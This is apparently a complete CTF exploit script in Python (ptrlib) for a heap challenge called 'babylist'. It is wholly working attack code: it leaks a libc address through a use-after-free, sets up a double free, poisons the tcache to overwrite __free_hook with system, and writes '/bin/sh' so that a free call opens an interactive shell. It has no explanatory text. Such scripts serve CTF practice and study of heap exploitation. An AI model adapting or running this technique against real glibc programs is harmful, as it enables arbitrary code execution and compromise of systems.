from ptrlib import *
import re
import time

def create(name):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.sendline(name)

def add(index, value):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.sendline(str(index))
    sock.sendline(str(value))

def view(index, pos):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.sendline(str(index))
    sock.recvuntil("into list:\n")
    sock.sendline(str(pos))
    line = sock.recvline()
    r = re.findall(b"(.+)\[(.+)\] = (.+)", line)
    w = int(r[0][2])
    if w < 0:
        w = (0xffffffff ^ (- w - 1))
    return r[0][0], int(r[0][1]), w

def dup(index, name):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.sendline(str(index))
    sock.sendline(name)

def remove(index):
    sock.recvuntil("> ")
    sock.sendline("5")
    sock.sendline(str(index))

libc = ELF("./libc-2.27.so")
sock = Process("./babylist")#Socket("localhost", 4001)
#sock = Socket("challenges3.fbctf.com", 1343)
main_arena = 0x3ebc40 + 0x60
one_gadget = 0x10a38c

create("0") # 0
for i in range(0x50 // 4):
    add(0, 0x1111)
dup(0, "1") # 1
for i in range(0x50 // 4):
    add(1, 0x2222)
create("libc leak") # 2
remove(1)

# fill up tcache for 0x21
for i in range(8):
    create(str(i)) # 3-9
remove(1)
for i in range(3, 9):
    remove(i)
remove(2)

# libc leak
addr_main_arena = (view(0, 1)[2] << 32) | view(0, 0)[2]
libc_base = addr_main_arena - main_arena
logger.info("libc base = " + hex(libc_base))

# double free
create("1") # 1
for i in range(8):
    add(1, 0xcafe)
dup(1, "PON") # 2
for i in range(8):
    add(1, i + 4)
    add(2, i + 4)

# TCache Poisoning
target = libc_base + libc.symbol('__free_hook') - 8
create("evil") # 3
add(3, target & 0xffffffff)
add(3, target >> 32)
for i in range(3):
    add(3, 0xdead)

#addr_one_gadget = libc_base + one_gadget
addr_system = libc_base + libc.symbol("system")
create("dummy") # 4
for i in range(5):
    add(4, 0xbeef)
create("free hook") # 5
add(5, u32("/bin"))
add(5, u32("/sh\x00"))
add(5, addr_system & 0xffffffff)
add(5, addr_system >> 32)
add(5, 0)

sock.interactive()
